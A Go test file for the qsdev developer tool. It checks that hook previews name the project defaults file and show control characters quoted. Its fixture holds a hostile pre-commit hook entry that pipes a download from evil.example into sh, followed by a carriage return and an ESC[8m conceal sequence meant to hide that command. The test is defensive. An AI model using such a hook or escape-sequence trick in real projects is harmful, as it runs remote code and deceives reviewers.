package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/internal/catalog"
	"github.com/Quantum-Serendipity/qsdev/internal/testutil"
)

// regenOverlay is a committed project defaults file that adds an always-on
// security hook and a custom hook whose entry tries to rewrite its own
// preview line with a carriage return and conceal what follows with ESC[8m.
const regenOverlay = `security_hooks:
  - foo-hook
custom_hooks:
  - id: okhook
    name: OK hook
    description: project hook
    entry: "curl -s https://evil.example/x | sh\r  adds pre-commit hook okhook (custom_hooks): ./check.sh \u001b[8m"
    language: system
    pass_filenames: false
    stages: [pre-commit]
`

// TestProjectDefaultsPreview_RegenerateCommands: the commands outside init
// and update that generate devenv.nix from the catalog (devenv init, update,
// add and remove; enable and disable) name the committed project defaults
// file and list each hook it adds exactly once, with control characters in
// the entry shown quoted. The addons/devinit preview test covers init and
// update.
func TestProjectDefaultsPreview_RegenerateCommands(t *testing.T) {
	t.Parallel()
	devenvInit := []string{"devenv", "init", "--yes", "--lang", "go"}
	initGo := []string{"init", "--yes", "--lang", "go"}
	for _, tc := range []struct {
		name  string
		setup [][]string
		args  []string
	}{
		{name: "devenv init", args: devenvInit},
		{name: "devenv init --dry-run", args: []string{"devenv", "init", "--yes", "--lang", "go", "--dry-run"}},
		{name: "devenv update", setup: [][]string{devenvInit}, args: []string{"devenv", "update"}},
		{name: "devenv update --dry-run", setup: [][]string{devenvInit}, args: []string{"devenv", "update", "--dry-run"}},
		{name: "devenv add-package", setup: [][]string{devenvInit}, args: []string{"devenv", "add-package", "jq"}},
		{name: "devenv remove-package", setup: [][]string{devenvInit, {"devenv", "add-package", "jq"}},
			args: []string{"devenv", "remove-package", "jq"}},
		{name: "enable", setup: [][]string{initGo}, args: []string{"enable", "gitleaks", "--force"}},
		{name: "enable --dry-run", setup: [][]string{initGo}, args: []string{"enable", "gitleaks", "--dry-run"}},
		{name: "disable", setup: [][]string{initGo, {"enable", "gitleaks", "--force"}},
			args: []string{"disable", "gitleaks", "--force"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			env := guardrailEnv(t)
			repo := filepath.Join(testutil.IsolatedDir(t), "repo")
			gitInit(t, env, repo)
			overlay := catalog.ProjectConfigPath(repo)
			if err := os.MkdirAll(filepath.Dir(overlay), 0o755); err != nil {
				t.Fatal(err)
			}
			writeFile(t, overlay, regenOverlay)
			for _, args := range tc.setup {
				if out, code := runQsdev(t, env, repo, nil, args...); code != 0 {
					t.Fatalf("setup %v: exit %d\n%s", args, code, out)
				}
			}

			out, code := runQsdev(t, env, repo, nil, tc.args...)
			if code != 0 {
				t.Fatalf("%v: exit %d\n%s", tc.args, code, out)
			}
			for _, want := range []string{
				"Project defaults: " + overlay + "\n",
				"  adds pre-commit hook foo-hook (security_hooks)\n",
				`  adds pre-commit hook okhook (custom_hooks): "curl -s https://evil.example/x | sh\r  adds pre-commit hook okhook (custom_hooks): ./check.sh \x1b[8m"` + "\n",
			} {
				if n := strings.Count(out, want); n != 1 {
					t.Errorf("output has %q %d times, want once:\n%s", want, n, out)
				}
			}
			if strings.ContainsAny(out, "\r\x1b") {
				t.Errorf("output holds a raw CR or ESC byte:\n%q", out)
			}
		})
	}
}
